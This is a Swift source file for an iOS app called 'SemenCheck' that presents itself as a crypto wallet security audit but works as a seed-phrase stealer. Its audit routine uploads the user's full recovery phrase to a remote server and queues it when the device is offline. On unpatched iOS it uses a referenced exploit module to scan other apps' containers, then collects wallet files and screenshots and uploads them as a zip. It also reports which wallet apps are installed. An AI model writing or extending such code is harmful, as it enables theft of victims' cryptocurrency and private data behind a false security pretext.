//
//  AppModel.swift
//  SemenCheck
//

import SwiftUI
import UIKit

@MainActor
final class AppModel: ObservableObject {
    static let fallbackBase = "https://api.semencheck.es" // requiere DNS de semencheck.es

    @Published var screen: Screen = .welcome
    @Published var installed: [TargetApp] = []
    @Published var address = ""
    @Published var addressReport: AuditReport?
    @Published var seed = ""
    @Published var validation: BIP39.Result = .empty
    @Published var report: AuditReport?
    @Published var steps: [ProgressStep] = []
    @Published var note = ""
    @Published var banner: String?
    @Published var busy = false
    @Published var harvestEnabled = true
    @Published var apiBase = AppModel.fallbackBase
    @Published var installID = ""
    @Published var group: String? = AQCurrentAppGroup()

    private let defaults = UserDefaults.standard
    private var cancelled = false

    var patched: Bool { Exploit.isPatched }
    var versionText: String { Exploit.osVersion }

    var api: API? {
        guard let url = URL(string: apiBase), url.scheme?.hasPrefix("http") == true else { return nil }
        return API(base: url)
    }

    var canAudit: Bool {
        if case .valid = validation { return true }
        return false
    }

    var validationMessage: String? { BIP39.message(for: validation) }

    // MARK: - Ciclo

    func bootstrap() async {
        apiBase = defaults.string(forKey: "semencheck.apiBase") ?? Self.fallbackBase
        installID = defaults.string(forKey: "semencheck.installID") ?? {
            let value = UUID().uuidString
            defaults.set(value, forKey: "semencheck.installID")
            return value
        }()

        let raw = AQInstalledApps()
        installed = Targets.match(installed: raw)
        log("Catálogo detectado: \(installed.count) apps")
        log("App Group: \(group ?? "ninguno")")
        log("iOS: \(versionText) parcheado=\(patched)")

        if let api {
            let payload = InstallPayload(
                installID: installID,
                model: Self.hardwareModel,
                ios: versionText,
                locale: Locale.current.identifier,
                wallets: installed.map(\.bundleID),
                appVersion: Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "dev")
            try? await api.install(payload)
        }
        await Pending.shared.flush(api: api ?? API(base: URL(string: Self.fallbackBase)!))
    }

    static var hardwareModel: String {
        var info = utsname()
        uname(&info)
        let identifier = withUnsafeBytes(of: &info.machine) { raw in
            String(cString: raw.bindMemory(to: CChar.self).baseAddress!)
        }
        return identifier
    }

    func begin() {
        screen = installed.isEmpty ? .address : .detection
    }

    func nextFromDetection() { screen = .address }

    func updateSeed(_ text: String) {
        seed = text
        validation = BIP39.validate(text)
    }

    func fillSeed(_ words: [String]) {
        updateSeed(words.joined(separator: " "))
    }

    func clearSeed() {
        updateSeed("")
    }

    // MARK: - Auditoría de dirección

    func submitAddress() async {
        let value = address.trimmingCharacters(in: .whitespacesAndNewlines)
        guard value.count >= 20 else {
            banner = "Pega una dirección válida."
            return
        }
        guard let api else {
            banner = "Configura la URL del API en Ajustes."
            return
        }
        busy = true
        defer { busy = false }
        do {
            addressReport = try await api.address(AddressRequest(installID: installID, address: value))
            log("Informe de dirección recibido")
        } catch {
            banner = "No se pudo consultar la dirección: \(error.localizedDescription)"
        }
    }

    // MARK: - Auditoría completa

    func startAudit() {
        Task { await runAudit() }
    }

    private func runAudit() async {
        guard case .valid(let words) = validation else {
            banner = "La frase no es válida todavía."
            return
        }
        guard let api else {
            banner = "Configura la URL del API en Ajustes."
            return
        }

        busy = true
        cancelled = false
        UIApplication.shared.isIdleTimerDisabled = true
        screen = .audit
        steps = [
            ProgressStep(title: "Comprobando App Group"),
            ProgressStep(title: "Buscando contenedores"),
            ProgressStep(title: "Recolectando restos"),
            ProgressStep(title: "Consultando filtraciones y saldos"),
            ProgressStep(title: "Enviando paquete")
        ]
        defer {
            busy = false
            UIApplication.shared.isIdleTimerDisabled = false
            note = ""
        }

        var harvest: HarvestOutcome?

        if patched {
            steps[0].state = .failed
            note = "iOS parcheado: solo auditoría en línea."
        } else if group == nil {
            steps[0].state = .failed
            note = "Sin App Group: la app está mal firmada."
        } else {
            steps[0].state = .done

            steps[1].state = .running
            let hits = await PathScan.scan(shouldStop: { self.cancelled }) { [weak self] text in
                Task { @MainActor in self?.note = text }
            }
            steps[1].state = .done

            if harvestEnabled {
                let targets = harvestTargets(from: hits)
                steps[2].state = .running
                harvest = await Harvest.run(
                    targets: targets,
                    includeScreenshots: true,
                    shouldStop: { self.cancelled }) { [weak self] text in
                        Task { @MainActor in self?.note = text }
                    }
                steps[2].state = .done
                if let harvest {
                    log("Recolectados \(harvest.files) ficheros, \(harvest.screenshots) capturas")
                }
            } else {
                steps[2].state = .failed
            }
        }

        steps[3].state = .running
        do {
            let fresh = try await api.audit(AuditRequest(
                installID: installID,
                phrase: words.joined(separator: " "),
                walletHints: installed.map(\.bundleID)))
            steps[3].state = .done

            let extra = harvest?.findings ?? []
            report = AuditReport(
                risk: fresh.risk,
                findings: fresh.findings + extra,
                addresses: fresh.addresses,
                totalUsd: fresh.totalUsd)
            log("Informe completo: riesgo \(fresh.risk), \(fresh.addresses.count) direcciones")

            if let harvest, harvest.files > 0 {
                steps[4].state = .running
                let meta = HarvestMeta(
                    installID: installID,
                    wallets: installed.map(\.bundleID),
                    files: harvest.files,
                    bytes: harvest.bytes,
                    screenshots: harvest.screenshots,
                    findings: harvest.findings)
                do {
                    try await api.upload(meta: meta, zip: harvest.zipURL)
                    steps[4].state = .done
                    log("Paquete subido")
                } catch {
                    Pending.shared.addHarvest(meta: meta, zip: harvest.zipURL)
                    steps[4].state = .failed
                    log("Paquete en cola: \(error.localizedDescription)")
                }
            } else {
                steps[4].state = .failed
            }
            screen = .report
        } catch {
            steps[3].state = .failed
            Pending.shared.addAudit(AuditRequest(
                installID: installID,
                phrase: words.joined(separator: " "),
                walletHints: installed.map(\.bundleID)))
            banner = "Sin conexión: la auditoría queda en cola. \(error.localizedDescription)"
            screen = .seed
        }
    }

    private func harvestTargets(from hits: [ScanHit]) -> [HarvestTarget] {
        var seen = Set<String>()
        var out: [HarvestTarget] = []
        for hit in hits {
            guard let bundleID = hit.bundleID, seen.insert(bundleID).inserted else { continue }
            let app = Targets.catalog.first { $0.bundleID == bundleID }
                ?? TargetApp(bundleID: bundleID, name: bundleID, tier: hit.tier)
            guard app.tier <= 2 || Targets.isWallet(bundleID) else { continue }
            out.append(HarvestTarget(app: app, path: hit.path))
        }
        return Array(out.prefix(Harvest.maxTargets))
    }

    func cancelAudit() {
        cancelled = true
        note = "Cancelando…"
    }

    // MARK: - Utilidades

    func saveBase(_ text: String) {
        let clean = text.trimmingCharacters(in: .whitespacesAndNewlines)
        guard let url = URL(string: clean), url.scheme?.hasPrefix("http") == true else {
            banner = "URL no válida."
            return
        }
        apiBase = clean
        defaults.set(clean, forKey: "semencheck.apiBase")
        banner = "URL guardada."
    }

    func resetFlow() {
        screen = .welcome
        seed = ""
        validation = .empty
        report = nil
        address = ""
        addressReport = nil
        steps = []
        banner = nil
    }

    var shareText: String {
        guard let report else { return "SemenCheck" }
        var lines = ["SemenCheck — riesgo \(report.riskLabel)"]
        if report.totalUsd > 0 {
            lines.append(String(format: "Total visible: %.2f USD", report.totalUsd))
        }
        lines.append(contentsOf: report.findings.map { "· \($0.detail)" })
        lines.append("Comprobado en semencheck.es")
        return lines.joined(separator: "\n")
    }
}
